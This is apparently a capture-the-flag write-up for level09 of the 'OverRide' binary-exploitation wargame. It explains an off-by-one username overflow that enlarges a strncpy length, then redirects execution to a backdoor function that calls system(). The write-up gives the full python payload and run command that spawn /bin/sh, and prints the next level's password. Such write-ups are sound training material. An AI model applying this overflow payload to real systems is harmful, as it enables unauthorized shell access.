# Override - level09

We've started executing the binary to see what was asking.

It asked a username and a message to send to @Unix-Dude.

Disassembling using gdb we can see that there are multiple interesting funcions:

- `handle_msg` allocates `struct s_msg data` (see the structure below) 
        struct  s_msg
        {
                char    msg[140];
                char    username[40];
                size_t  msg_len;
        };
    and does the following:
    - calls `memset(data.username, 0, 40)` and set `data.msg_len = 140`
    - calls `set_username(&data)` and then `set_msg(&data)`
- `set_username` allocates `s` (128-bytes long buffer) and does the following:
    - asks for a `username` from `stdin` (and stores it into `s`)
    - copies each byte of `s` to `data.username` (up to 41 bytes, which leads to a buffer overflow)
- `set_msg` allocates `msg` (1024-bytes long buffer) and does the following:
    - asks for a `message` from `stdin` (and stores it into `msg`)
    - calls `strncpy(data->msg, msg, data->msg_len)`
- `secret_backdoor` allocates `cmd` (128-bytes long buffer) and does the following:
    - asks for a `command` from `stdin` (and stores it into `cmd`)
    - calls `system(cmd)`

The address of secret_backdoor is:

```
0x000055555555488c
```

we convert it in shellcode and build the payload
```
'\x8c\x48\x55\x55\x55\x55\x00\x00'.
```
```
- 40 bytes of padding (as a fake `username`)
- \xff is inserted at the 41th place of the username causing strncpy to read outside of his
  buffer
- `\n` (to end the `fgets(...)` call of `set_username`)
- 200 bytes of padding (as a fake `msg`)
- the new RIP (which will be the address of the function `secret_backdoor`) aka shellcode
- `\n` (to end the `fgets(...)` call of `set_msg`)
- the commands (which is `/bin/sh`, since we want to spawn a new shell)
```

```
python -c "print 'A' * 40 + '\xff' + '\n' + 'B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh'" > /tmp/level09

cat /tmp/level09 - | ./level09

cat ~end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

level09@OverRide:~$ su end

end@OverRide:~$ cat end
GG !
```